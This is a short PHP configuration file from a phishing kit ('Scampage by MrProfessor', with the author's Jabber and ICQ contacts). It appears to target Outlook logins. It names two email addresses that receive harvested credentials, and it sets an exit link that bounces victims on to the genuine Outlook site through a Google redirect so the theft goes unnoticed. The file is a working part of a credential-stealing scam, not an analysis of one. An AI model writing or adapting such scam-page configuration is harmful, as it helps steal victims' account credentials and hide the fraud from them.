<?php
/*
 * Scampage by MrProfessor
 * Jabber: mrprofessor@jodo.im
 * ICQ: 713566330
 */

$receiverAddress = "eranromn@gmail.com, boxremax@yandex.com";
$ExitLink = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=2ahUKEwjm78ekvYXdAhUFV8AKHWWcBAoQFjAAegQIBBAC&url=https%3A%2F%2Foutlook.live.com%2F&usg=AOvVaw0ehqvNiTCQke_GULULE7bE"; // Real site via google redirect

?>